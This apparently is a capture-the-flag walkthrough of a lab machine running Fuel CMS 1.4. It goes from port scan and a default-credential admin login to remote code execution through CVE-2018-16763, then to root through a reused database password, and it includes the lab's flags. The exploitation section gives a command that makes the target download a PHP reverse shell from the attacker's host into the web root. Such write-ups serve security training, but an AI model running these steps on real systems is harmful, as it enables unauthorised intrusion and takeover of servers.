---
sticker: lucide//flame
---
# ENUMERATION
---



## OPEN PORTS
---

| PORT | SERVICE |
| :--- | :------ |
| 80   | HTTP    |

```
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/fuel/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Welcome to FUEL CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

# RECONNAISSANCE
---


We only got a website, let's check it out:



![Pasted image 20250409164857.png](../../IMAGES/Pasted%20image%2020250409164857.png)

We are dealing with something called `Fuel CMS` at version `1.4`, let's check `robots.txt` since the entrance is allowed:


![Pasted image 20250409164943.png](../../IMAGES/Pasted%20image%2020250409164943.png)


We got a `/fuel` directory:



![Pasted image 20250409165010.png](../../IMAGES/Pasted%20image%2020250409165010.png)

It takes us to a login page, if we take a deeper look at the main page, we can see this:

![Pasted image 20250409165238.png](../../IMAGES/Pasted%20image%2020250409165238.png)

Maybe default credentials still work, let's try:

![Pasted image 20250409165313.png](../../IMAGES/Pasted%20image%2020250409165313.png)

There we go, default credentials work, let's proceed to exploitation phase.



# EXPLOITATION
---


Since we already got access to the admin panel, we can start searching for a way to get a shell, for example, since we already know we are dealing with `Fuel CMS 1.4`, we can take a look for any exploit:


![Pasted image 20250409165623.png](../../IMAGES/Pasted%20image%2020250409165623.png)

We got a `RCE` exploit on GitHub, this exploits CVE-2018-16763, if we search this CVE, we can find this information:

```
Description

FUEL CMS 1.4.1 allows PHP Code Evaluation via the pages/select/ filter parameter or the preview/ data parameter. This can lead to Pre-Auth Remote Code Execution.
```


Let's download the exploit and test:

```
GITHUB: https://github.com/noraj/fuelcms-rce
```

![Pasted image 20250409165739.png](../../IMAGES/Pasted%20image%2020250409165739.png)

There we go, we got `RCE`, we can download a reverse shell file and put it into the machine like this: 

```
ruby exploit.rb http://10.10.172.18/ "wget+http://10.6.34.159:8000/thm_shell.php+-O+/var/www/html/shell.php"
```

We can see it gets downloaded:

![Pasted image 20250409171154.png](../../IMAGES/Pasted%20image%2020250409171154.png)

Now, we can simply visit:

```
http://IP/shell.php
```

If we got our listener ready, we'll see the connection:

![Pasted image 20250409171256.png](../../IMAGES/Pasted%20image%2020250409171256.png)



# PRIVILEGE ESCALATION
---


First step is to get a stable shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250409171335.png](../../IMAGES/Pasted%20image%2020250409171335.png)

We can read first flag:

```
www-data@ubuntu:/home/www-data$ cat flag.txt
6470e394cbf6dab6a91682cc8585059b
```

I used `linpeas` and found this, since there are no `4000 SUID` binaries or other stuff like that, maybe this will do to get root:


![Pasted image 20250409172944.png](../../IMAGES/Pasted%20image%2020250409172944.png)

We got a password, let's switch to root:

![Pasted image 20250409173005.png](../../IMAGES/Pasted%20image%2020250409173005.png)

Yeah, they reused the password for the database with the same as the bash console, let's get root flag:

```
root@ubuntu:/home/www-data# cat /root/root.txt
b9bbcb33e11b80be759c4e844862482d
```


![Pasted image 20250409173046.png](../../IMAGES/Pasted%20image%2020250409173046.png)


